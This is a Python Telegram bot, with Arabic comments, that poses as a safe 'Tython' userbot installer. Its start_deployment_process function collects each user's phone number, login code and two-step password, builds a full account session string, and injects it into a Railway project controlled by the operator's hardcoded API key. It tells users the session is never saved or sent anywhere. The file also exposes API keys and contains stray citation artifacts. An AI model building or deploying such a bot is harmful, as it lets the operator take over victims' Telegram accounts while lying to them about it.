import os
import asyncio
import requests
import sqlite3
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError
)

# ⪼ إعدادات التوكنات والـ API
BOT_TOKEN = os.environ.get("BOT_TOKEN", "توكن_البوت_هنا") 
API_ID = 7219208 #[span_3](start_span)[span_3](end_span)
API_HASH = "64342b78a8d90e3f691d7a3a09112e7b" #[span_4](start_span)[span_4](end_span)
RAILWAY_API_KEY = "4f08e771-2c65-4bb2-a0ee-eb9acff7a867" #[span_5](start_span)[span_5](end_span)

# ⪼ إعداد قاعدة البيانات[span_6](start_span)[span_6](end_span)
conn = sqlite3.connect('deployments.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, project_id TEXT)')
conn.commit()

# ⪼ تهيئة البوت
bot = TelegramClient('deployer_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

def deploy_independent_project(session_string, user_bot_token, user_id):
    """ دالة التنصيب على رايلوي (كما هي من كودك مع التعديلات) """
    url = "https://backboard.railway.app/graphql/v2" #[span_7](start_span)[span_7](end_span)
    headers = {
        "Authorization": f"Bearer {RAILWAY_API_KEY}",
        "Content-Type": "application/json"
    }

    try:
        # 1. إنشاء مشروع مستقل
        q_project = """mutation projectCreate($name: String!) { projectCreate(input: { name: $name }) { id environments { edges { node { id } } } } }"""
        res_proj = requests.post(url, json={"query": q_project, "variables": {"name": f"Tython-User-{user_id}"}}, headers=headers).json()
        
        if "errors" in res_proj:
            return False, f"⚠️ خطأ في رايلوي: `{res_proj['errors'][0]['message']}`"
        
        project_id = res_proj["data"]["projectCreate"]["id"]
        environment_id = res_proj["data"]["projectCreate"]["environments"]["edges"][0]["node"]["id"]

        q_service_clean = """mutation serviceCreate($projectId: String!, $name: String!, $source: ServiceSourceInput!) { serviceCreate(input: { projectId: $projectId, name: $name, source: $source }) { id } }"""
        
        # 2. إنشاء Postgres
        res_db = requests.post(url, json={"query": q_service_clean, "variables": {"projectId": project_id, "name": "postgres", "source": { "image": "postgres:15" }}}, headers=headers).json()

        # 3. إنشاء خدمة السورس
        res_repo = requests.post(url, json={"query": q_service_clean, "variables": {"projectId": project_id, "name": "tython-worker", "source": { "repo": "https://github.com/mustafanqnq-cmd/sarmdi-web-mine.git" }}}, headers=headers).json()
        service_id = res_repo["data"]["serviceCreate"]["id"]

        # 4. حقن الفارات السرية
        env_variables = {
            "API_HASH": API_HASH,
            "API_ID": str(API_ID),
            "ENV": ".",
            "LAUNCHER_PROXY_URL": "https://falling-leafgithub-proxy.mustafanqnq.workers.dev/",
            "LAUNCHER_SECRET": "SUPHE999",
            "TZ": "Asia/Baghdad",
            "SESSION": session_string,
            "BOT_TOKEN": user_bot_token,
            "DATABASE_URL": "${{postgres.DATABASE_URL}}"
        }

        q_vars = """mutation variableCollectionUpsert($input: VariableCollectionUpsertInput!) { variableCollectionUpsert(input: $input) }"""
        requests.post(url, json={"query": q_vars, "variables": {"input": {"projectId": project_id, "environmentId": environment_id, "serviceId": service_id, "variables": env_variables}}}, headers=headers)

        return True, project_id
    except Exception as e:
        return False, f"خطأ برمجي: {str(e)}"

# ⪼ واجهة البوت الأساسية
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    buttons = [
        [Button.inline("🚀 بدء تنصيب تايثون", data="start_deploy")],
        [Button.inline("📊 عدد المستخدمين", data="users_count")]
    ]
    await event.reply(
        "**⎉╎أهلاً بك في بوت تنصيب سورس تايثون التلقائي 🚀**\n\n"
        "⪼ من خلال هذا البوت يمكنك تنصيب السورس الخاص بك بخطوات بسيطة وآمنة تماماً.\n"
        "⪼ الجلسة يتم استخراجها برمجياً وتُرفع مباشرة للخادم دون أن تُحفظ أو تُرسل لأحد.",
        buttons=buttons
    )

# ⪼ أزرار الإنلاين
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode('utf-8')
    user_id = event.sender_id
    
    if data == "users_count":
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        await event.answer(f"📊 عدد المستخدمين المنصبين حالياً: {count}", alert=True)

    elif data == "start_deploy":
        # التحقق من وجود تنصيب مسبق
        cursor.execute('SELECT project_id FROM users WHERE user_id = ?', (user_id,))
        if cursor.fetchone():
            await event.answer("⚠️ لديك تنصيب قائم بالفعل!", alert=True)
            return
        
        await event.answer("جاري بدء عملية التنصيب...", alert=False)
        await start_deployment_process(event.chat_id, user_id)

async def start_deployment_process(chat_id, user_id):
    """ نظام المحادثة لاستخراج الجلسة والتوكن والتنصيب """
    async with bot.conversation(chat_id, timeout=300) as conv:
        try:
            # 1. طلب الرقم
            await conv.send_message("**⎉╎أرسل الآن رقم هاتفك مع الرمز الدولي (مثال: +964...) 📱**")
            phone_msg = await conv.get_response()
            phone = phone_msg.text.replace("+", "").replace(" ", "")
            
            status = await conv.send_message(f"**⎉╎جاري الاتصال بتليجرام للرقم {phone}... ⏳**")
            
            # 2. إنشاء جلسة مؤقتة للمستخدم
            temp_client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="TYTHON Installer", system_version="Bot", app_version="1.0.0", lang_code="ar") #[span_8](start_span)[span_8](end_span)
            await temp_client.connect()
            
            try:
                sent_code = await temp_client.send_code_request(phone) #[span_9](start_span)[span_9](end_span)
            except FloodWaitError as e:
                await status.edit(f"**⪼ محاولات كثيرة، انتظر {e.seconds} ثانية وحاول مجددًا ⏣**")
                return

            await status.edit("**⎉╎تم إرسال كود التحقق 📩**\n**⪼ أرسل الكود بصيغة متباعدة (مثال: 7 2 1 4 3) 🔐**")
            
            # 3. استلام الكود
            code_msg = await conv.get_response()
            code = code_msg.text.replace(" ", "")
            
            try:
                await temp_client.sign_in(phone, code, phone_code_hash=sent_code.phone_code_hash) #[span_10](start_span)[span_10](end_span)
            except SessionPasswordNeededError:
                await conv.send_message("**⎉╎الحساب محمي بتحقق بخطوتين، أرسل كلمة السر 🔑**")
                pass_msg = await conv.get_response()
                await temp_client.sign_in(password=pass_msg.text) #[span_11](start_span)[span_11](end_span)

            # 4. حفظ الجلسة في المتغير دون إرسالها للمستخدم
            session_string = temp_client.session.save() #[span_12](start_span)[span_12](end_span)
            await temp_client.disconnect()

            # 5. طلب توكن البوت
            instructions = (
                "**⎉╎تم استخراج الجلسة داخلياً وتأمينها بنجاح ✅**\n\n"
                "**⪼ الآن، نحتاج إلى توكن البوت الخاص بك.**\n"
                "1. اذهب إلى @BotFather\n"
                "2. أرسل أمر `/newbot` لصنع بوت جديد.\n"
                "3. انسخ التوكن (Token) وأرسله هنا 👇"
            )
            await conv.send_message(instructions)
            token_msg = await conv.get_response()
            user_bot_token = token_msg.text.strip()

            # 6. بدء عملية التنصيب الصامتة
            deploy_msg = await conv.send_message("**⏳ جاري الآن بناء مشروعك على الخادم وربط السورس... يرجى الانتظار 🔄**")
            
            success, result = deploy_independent_project(session_string, user_bot_token, user_id)

            if success:
                cursor.execute('INSERT INTO users (user_id, project_id) VALUES (?, ?)', (user_id, result)) #[span_13](start_span)[span_13](end_span)
                conn.commit()
                await deploy_msg.edit(
                    f"✅ **تم تنصيب سورس تايثون بنجاح تام!**\n\n"
                    f"🔹 تم تشفير الجلسة وحقنها تلقائياً.\n"
                    f"🔹 تم ربط توكن البوت الخاص بك.\n"
                    f"🚀 معرف مشروعك: `{result}`\n\n"
                    f"**⪼ يمكنك الآن التوجه لبوتك واستخدام السورس.**"
                )
            else:
                await deploy_msg.edit(f"❌ **فشل التنصيب:**\n\n{result}")

        except asyncio.TimeoutError:
            await conv.send_message("**⪼ انتهى الوقت، يرجى إعادة المحاولة من جديد ⏣**")
        except Exception as e:
            await conv.send_message(f"**⪼ حدث خطأ: {e} ⏣**")
        finally:
            if 'temp_client' in locals() and temp_client.is_connected():
                await temp_client.disconnect()

print("Tython Auto-Installer Bot is Running...")
bot.run_until_disconnected()
